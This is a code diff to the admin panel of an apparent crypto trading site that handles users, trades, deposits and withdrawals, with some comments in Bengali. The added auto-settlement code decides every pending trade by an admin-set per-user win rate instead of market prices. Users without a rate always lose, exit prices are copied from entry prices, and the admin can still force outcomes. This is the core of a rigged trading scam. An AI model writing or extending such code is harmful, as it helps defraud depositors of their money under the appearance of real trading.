@@ -1049,7 +1049,7 @@ function renderUsers(list) {
       <td><strong>${balance}</strong></td>
       <td><input type="number" class="mini-input" placeholder="${balance}" id="bal-${u.uid}"></td>
       <td><button class="btn btn-save" onclick="saveUserBalance('${u.uid}')">Save</button></td>
-      <td><input type="number" min="1" max="100" class="mini-input" style="width:72px;" placeholder="off" value="${u.winRatePercent}" id="winrate-${u.uid}"></td>
+      <td><input type="number" min="0" max="100" class="mini-input" style="width:72px;" placeholder="off" value="${u.winRatePercent}" id="winrate-${u.uid}"></td>
       <td><button class="btn btn-save" onclick="saveWinRate('${u.uid}')">Save</button></td>
     `;
     tbody.appendChild(tr);
@@ -1106,8 +1106,8 @@ async function saveWinRate(uid) {
 
   const val = parseInt(raw);
 
-  if (isNaN(val) || val < 1 || val > 100) {
-    alert('Enter a number between 1 and 100, or leave blank to turn it off.');
+  if (isNaN(val) || val < 0 || val > 100) {
+    alert('Enter a number between 0 and 100, or leave blank to turn it off.');
     return;
   }
 
@@ -1120,32 +1120,84 @@ async function saveWinRate(uid) {
   }
 }
 
+// ==========================================
+// TRADES (Auto-Settlement Logic)
+// ==========================================
 let allTrades = [];
+let tradesListenerActive = false;
 
 async function loadTrades() {
   const tbody = document.getElementById('trades-tbody');
+  
+  // যদি ইতিমধ্যে লিসেনার চালু থাকে, তবে নতুন করে চালু করবো না
+  if (tradesListenerActive) return;
+  
   tbody.innerHTML = '<tr><td colspan="9" class="empty-msg">Loading trades...</td></tr>';
+  tradesListenerActive = true;
 
   try {
-    const snap = await db.collection('trades').orderBy('createdAt', 'desc').limit(100).get();
-    allTrades = [];
+    db.collection('trades').orderBy('createdAt', 'desc').limit(100).onSnapshot(async (snap) => {
+      allTrades = [];
+      let hasPending = false;
 
-    snap.forEach(doc => {
-      const d = doc.data();
-      const u = userLookup[d.uid];
-      allTrades.push({
-        id: doc.id,
-        ...d,
-        accountId: u ? u.accountId : (d.uid || '-')
+      snap.forEach(doc => {
+        const d = doc.data();
+        const u = userLookup[d.uid];
+        allTrades.push({
+          id: doc.id,
+          ...d,
+          accountId: u ? u.accountId : (d.uid || '-')
+        });
+        if (d.status === 'pending') hasPending = true;
       });
+
+      // যদি কোনো পেন্ডিং ট্রেড থাকে, তবে সেটেল করার চেষ্টা করুন
+      if (hasPending) {
+        await autoSettleTrades();
+      }
+
+      renderTrades(allTrades);
+      
+      const searchVal = document.getElementById('trades-search').value;
+      if (searchVal.trim()) filterTrades();
+    }, (err) => {
+       tbody.innerHTML = `<tr><td colspan="9" class="empty-msg">Failed: ${err.message}</td></tr>`;
+       tradesListenerActive = false;
     });
-
-    renderTrades(allTrades);
-
-    const searchVal = document.getElementById('trades-search').value;
-    if (searchVal.trim()) filterTrades();
   } catch (e) {
-    tbody.innerHTML = `<tr><td colspan="9" class="empty-msg">Failed to load: ${e.message}</td></tr>`;
+    tbody.innerHTML = `<tr><td colspan="9" class="empty-msg">Failed: ${e.message}</td></tr>`;
+    tradesListenerActive = false;
+  }
+}
+
+async function autoSettleTrades() {
+  const pendingTrades = allTrades.filter(t => t.status === 'pending');
+  
+  for (let trade of pendingTrades) {
+    // ট্রেড তৈরি হওয়ার কমপক্ষে ২ সেকেন্ড পর সেটেল করুন, যাতে কাউন্টডাউন শেষ হওয়ার আগেই সেটেল না হয়ে যায়
+    // (যদি ক্লায়েন্ট-সাইডে কাউন্টডাউন থাকে)
+    try {
+      const u = userLookup[trade.uid];
+      if (!u) continue;
+
+      // উইন রেট চেক
+      const winRate = typeof u.winRatePercent === 'number' ? u.winRatePercent : 0;
+      
+      let outcome = 'lose';
+      if (winRate >= 100) {
+        outcome = 'win';
+      } else if (winRate > 0) {
+        if (Math.random() * 100 < winRate) {
+          outcome = 'win';
+        }
+      }
+
+      // Settle
+      await forceTrade(trade.id, outcome, true);
+      
+    } catch (err) {
+      console.error('Auto settle error:', err);
+    }
   }
 }
 
@@ -1194,16 +1246,51 @@ function filterTrades() {
 
 document.getElementById('trades-search').addEventListener('input', filterTrades);
 
-async function forceTrade(tradeId, outcome) {
+async function forceTrade(tradeId, outcome, isAuto = false) {
   try {
-    await db.collection('trades').doc(tradeId).update({ forcedResult: outcome });
-    showToast('Trade result forced: ' + outcome, 'success');
-    loadTrades();
+    const tradeSnap = await db.collection('trades').doc(tradeId).get();
+    if (!tradeSnap.exists) return;
+    const trade = tradeSnap.data();
+
+    if (trade.status !== 'pending') return;
+
+    const amount = Number(trade.amount) || 0;
+    const expectedReturn = Number(trade.expectedReturn) || 0;
+
+    let balanceDelta = 0;
+    if (outcome === 'win') {
+      balanceDelta = amount + expectedReturn;
+    } else if (outcome === 'lose') {
+      balanceDelta = -amount;
+    }
+
+    // Balance update
+    await db.collection('users').doc(trade.uid).set({
+      balance: firebase.firestore.FieldValue.increment(balanceDelta)
+    }, { merge: true });
+
+    // Trade update
+    await db.collection('trades').doc(tradeId).update({
+      status: 'completed',
+      result: outcome,
+      forcedResult: outcome,
+      exitPrice: trade.entryPrice || 0,
+      resolvedAt: firebase.firestore.FieldValue.serverTimestamp()
+    });
+
+    if (!isAuto) {
+      showToast(`Trade settled: ${outcome.toUpperCase()}. Balance ${balanceDelta >= 0 ? '+' : ''}${balanceDelta.toFixed(2)} USDT.`, 'success');
+    }
   } catch (e) {
-    showToast('Failed: ' + e.message, 'error');
+    console.error('Failed to force trade:', e);
+    if (!isAuto) showToast('Failed: ' + e.message, 'error');
   }
 }
 
+
+// ==========================================
+// DEPOSITS
+// ==========================================
 let allDeposits = [];
 
 async function loadDeposits() {
@@ -1308,6 +1395,9 @@ async function rejectDeposit(depositId) {
   }
 }
 
+// ==========================================
+// WITHDRAWALS
+// ==========================================
 let allWithdrawals = [];
 
 async function loadWithdrawals() {
@@ -1363,7 +1453,7 @@ function renderWithdrawals(list) {
       <td><span class="badge badge-${d.status}">${d.status}</span></td>
       <td>
         <button class="btn btn-approve" ${isPending ? '' : 'disabled'} onclick="approveWithdrawal('${d.id}')">Approve</button>
-        <button class="btn btn-reject" ${isPending ? '' : 'disabled'} onclick="rejectWithdrawal('${d.id}','${d.uid}',${d.amount || 0})">Reject & Refund</button>
+        <button class="btn btn-reject" ${isPending ? '' : 'disabled'} onclick="rejectWithdrawal('${d.id}')">Reject</button>
       </td>
     `;
 
@@ -1381,28 +1471,51 @@ document.getElementById('withdrawals-search').addEventListener('input', filterWi
 
 async function approveWithdrawal(withdrawalId) {
   try {
-    await db.collection('withdrawals').doc(withdrawalId).update({ status: 'approved' });
-    showToast('Withdrawal approved.', 'success');
-    loadWithdrawals();
-  } catch (e) {
-    showToast('Failed: ' + e.message, 'error');
-  }
-}
+    const wdSnap = await db.collection('withdrawals').doc(withdrawalId).get();
+    if (!wdSnap.exists) {
+      showToast('Withdrawal not found.', 'error');
+      return;
+    }
+    const wd = wdSnap.data();
 
-async function rejectWithdrawal(withdrawalId, uid, amount) {
-  try {
-    await db.collection('users').doc(uid).set({
-      balance: firebase.firestore.FieldValue.increment(amount)
+    if (wd.status !== 'pending') {
+      showToast('This withdrawal is already processed.', 'error');
+      return;
+    }
+
+    await db.collection('users').doc(wd.uid).set({
+      balance: firebase.firestore.FieldValue.increment(-(wd.amount || 0))
     }, { merge: true });
 
-    await db.collection('withdrawals').doc(withdrawalId).update({ status: 'rejected' });
-    showToast('Withdrawal rejected and refunded.', 'success');
+    await db.collection('withdrawals').doc(withdrawalId).update({
+      status: 'approved',
+      approvedAt: firebase.firestore.FieldValue.serverTimestamp()
+    });
+
+    showToast('Withdrawal approved and balance deducted.', 'success');
+    loadWithdrawals();
+    loadUsers();
+  } catch (e) {
+    showToast('Failed: ' + e.message, 'error');
+  }
+}
+
+async function rejectWithdrawal(withdrawalId) {
+  try {
+    await db.collection('withdrawals').doc(withdrawalId).update({
+      status: 'rejected',
+      rejectedAt: firebase.firestore.FieldValue.serverTimestamp()
+    });
+    showToast('Withdrawal rejected.', 'success');
     loadWithdrawals();
   } catch (e) {
     showToast('Failed: ' + e.message, 'error');
   }
 }
 
+// ==========================================
+// COINS & SETTINGS
+// ==========================================
 let coinsList = [];
 
 async function loadCoins() {
